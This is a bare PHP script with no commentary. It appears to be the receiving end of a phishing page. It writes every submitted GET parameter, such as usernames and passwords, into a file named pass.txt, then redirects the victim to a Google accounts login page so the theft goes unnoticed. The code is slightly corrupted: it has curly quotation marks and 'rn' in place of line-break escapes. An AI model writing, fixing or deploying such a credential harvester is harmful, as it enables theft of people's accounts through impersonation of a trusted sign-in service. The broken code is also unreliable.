<?php
header(“Location: https://www.google.com/accounts/ServiceLoginAuth “);
$handle = fopen(“pass.txt”, “a”);
foreach($_GET as $variable => $value) {
fwrite($handle, $variable);
fwrite($handle, “=”);
fwrite($handle, $value);
fwrite($handle, “rn”);
}
fwrite($handle, “rn”);
fclose($handle);
exit;
?>
